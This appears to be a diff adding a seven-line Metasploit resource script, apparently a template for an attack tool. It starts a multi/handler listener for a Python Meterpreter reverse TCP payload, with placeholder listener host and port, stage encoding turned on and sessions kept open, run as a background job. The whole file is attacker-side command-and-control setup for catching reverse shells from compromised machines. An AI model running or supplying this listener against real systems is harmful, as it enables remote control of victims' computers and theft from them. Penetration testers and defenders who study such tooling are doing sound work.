@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set PAYLOAD python/meterpreter/reverse_tcp
+set LHOST __LHOST__
+set LPORT __LPORT__
+set EnableStageEncoding true
+set ExitOnSession false
+exploit -j
